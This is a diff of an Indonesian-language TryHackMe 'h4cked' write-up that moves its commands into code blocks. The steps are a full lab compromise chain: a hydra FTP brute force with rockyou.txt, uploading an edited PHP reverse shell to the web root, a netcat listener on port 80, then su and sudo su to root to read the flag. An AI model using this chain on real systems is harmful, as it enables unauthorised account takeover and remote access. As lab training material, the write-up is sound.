@@ -138,24 +138,43 @@ rootkit
 
 ## Tak 2 Hack your way back into the machine
 - Disini kita akan melakukan hal yang sama seperti yang dilakukan oleh attacker
-- Brute force akun FTP jenny menggunakan tool hydra dengan perintah `hydra -l jenny -P /usr/share/wordlists/rockyou.txt <IP_Machine> ftp`
+- Brute force akun FTP `jenny` menggunakan tool `hydra` dan wordlist `rockyou.txt` yang ada di kali linux
+```sh
+hydra -l jenny -P /usr/share/wordlists/rockyou.txt <IP_Machine> ftp
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2018.JPG)
 
-- Kita berhasil menemukan password FTP jenny. Akses FTP server dengan perintah `ftp <IP_Machine>` setelah itu masukkan nama `jenny` dan password yang sudah ditemukan. Setelah berhasil login kita bisa mendownload file **shell.php** dengan perintah `get shell.php`
+- Password login FTP user `jenny` berhasil ditemukan. Sekarang kita akses FTP tersebut. Disana ditemukan file `shell.php`, download file tersebut ke local lalu logout dari FTP server
+```sh
+ftp <IP_Machine>
+get shell.php
+bye
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2019.JPG)
 
 - Edit file **shell.php** dengan editor nano. Ubah IP dengan IP tun0 pada komputer yang anda gunakan
+```sh
+nano shell.php
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2020.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2021.JPG)
 
-- Upload file **shell.php** yang sudah diedit ke FTP Server dengan perintah `put shell.php`
+- Upload file **shell.php** yang sudah diedit ke FTP Server dan pastikan posisi direktori di **/var/www/html**
+```sh
+ftp <IP_Machine>
+put shell.php
+bye
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2022.JPG)
 
-- Buka terminal baru dan buat netcat yang me listen port 80 dengan perintah `nc -lnvp 80`
+- Buat sebuah listener netcat di terminal baru dan set ke port 80 sesuai dengan konfigurasi file **shell.php** diatas
+```sh
+nc -lnvp 80
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2023.JPG)
 
@@ -174,15 +193,24 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2026.JPG)
 
-- Switch ke user jenny dengan perintah `su jenny` lalu masukkan password FTP jenny
+- Switch ke user jenny lalu masukkan password FTP jenny diatas
+```sh
+su jenny
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2027.JPG)
 
-- Masuk ke akses root dengan perintah `sudo su` lalu masukkan password FTP jenny
+- Masuk ke akses root lalu masukkan password FTP jenny
+```sh
+sudo su
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2028.JPG)
 
-- Root flag berada di directory **/root/Reptile** jadi kita bisa gunakan perintah `cat /root/Reptile/flag.txt` untuk mendapatkan root flag
+- Root flag berada di file **flag.txt** di directory **/root/Reptile**
+```sh
+cat /root/Reptile/flag.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2029.JPG)
 
